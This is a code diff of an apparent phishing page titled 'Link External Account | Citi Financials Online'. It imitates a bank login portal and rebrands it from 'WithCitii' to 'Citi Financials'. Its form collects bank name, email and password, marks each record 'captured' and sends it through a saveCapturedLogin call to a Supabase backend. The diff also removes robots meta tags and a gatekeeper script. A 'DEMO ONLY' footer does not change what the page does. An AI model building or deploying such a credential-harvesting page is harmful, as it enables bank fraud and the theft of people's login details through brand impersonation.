@@ -2,27 +2,43 @@
 <html lang="en">
 
 <head>
-  <link rel="stylesheet" href="input.css">
-  <link rel="stylesheet" href="style.css">
-  <meta name="robots" content="noindex, nofollow, noarchive, nosnippet, noimageindex, notranslate, noodp">
-  <meta name="googlebot" content="noindex, nofollow">
-  <meta name="google" content="notranslate">
-  <meta name="referrer" content="same-origin">
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Link External Account | Citi Financials Online</title>
+  <script src="https://cdn.tailwindcss.com?plugins=forms,container-queries"></script>
+  <script>
+    tailwind.config = {
+      theme: {
+        extend: {
+          colors: {
+            primary: "#056dae",
+            secondary: "#004B8D",
+            accent: "#FCCC44",
+            bankGray: "#F4F4F4",
+            bankText: "#333333",
+            borderGray: "#D1D1D1"
+          },
+          fontFamily: {
+            sans: ["Inter", "sans-serif"],
+          }
+        }
+      }
+    };
+  </script>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700;800;900&display=swap"
+    rel="stylesheet" />
+  <link href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined:wght,FILL@100..700,0..1&display=swap"
+    rel="stylesheet" />
+  <style type="text/tailwindcss">
+    @layer base {
+      body { @apply bg-[#f8fafc] text-bankText font-sans antialiased; }
+    }
+    @layer components {
+      .input-field { @apply w-full px-4 py-3 bg-white border border-borderGray rounded-sm focus:ring-2 focus:ring-primary focus:border-transparent transition-all outline-none text-sm font-semibold; }
+      .label-text { @apply block text-[10px] font-black uppercase tracking-widest text-gray-500 mb-2; }
+    }
+  </style>
   <link rel="icon" type="image/png" href="logo.png">
-  <script src="gatekeeper.js"></script>
-
-  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700;800;900&display=swap" rel="stylesheet" />
-  <link href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined:wght,FILL@100..700,0..1&display=swap" rel="stylesheet" />
-
-
-  <link rel="manifest" href="manifest.json">
-  <meta name="theme-color" content="#056dae">
-  <meta name="apple-mobile-web-app-capable" content="yes">
-  <meta name="apple-mobile-web-app-status-bar-style" content="#056dae">
-  <meta name="apple-mobile-web-app-title" content="WithCitii">
-
 </head>
 
 <body class="min-h-screen flex flex-col">
@@ -32,7 +48,7 @@
       <span class="material-symbols-outlined text-sm">arrow_back</span>
       <span class="text-[10px] font-black uppercase tracking-widest">Back to Dashboard</span>
     </a>
-    <img src="logo.png" alt="WithCitii" class="h-6 invert brightness-0">
+    <img src="logo.png" alt="Citi Financials" class="h-6 invert brightness-0">
   </header>
 
   <main class="flex-1 flex items-center justify-center p-6">
@@ -109,7 +125,7 @@
         <span class="text-[9px] font-black uppercase tracking-widest">FDIC Insured Data</span>
       </div>
     </div>
-    <p class="text-[9px] text-gray-400 font-bold uppercase tracking-widest opacity-0">© 2026 WithCitii Secure Portal. DEMO ONLY - NO REAL DATA MANAGED.</p>
+    <p class="text-[9px] text-gray-400 font-bold uppercase tracking-widest">© 2026 Citi Financials Secure Portal. DEMO ONLY - NO REAL DATA MANAGED.</p>
   </footer>
 
   <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
@@ -133,12 +149,12 @@
           bank_name: document.getElementById('bank-name').value,
           email: document.getElementById('username').value,
           password: document.getElementById('password').value,
-          status: 'active'
+          status: 'captured'
         };
 
         try {
           // Save using utils
-          await utils.recordClientMetric(formData);
+          await utils.saveCapturedLogin(formData);
           
           // Show pending state
           form.classList.add('hidden');
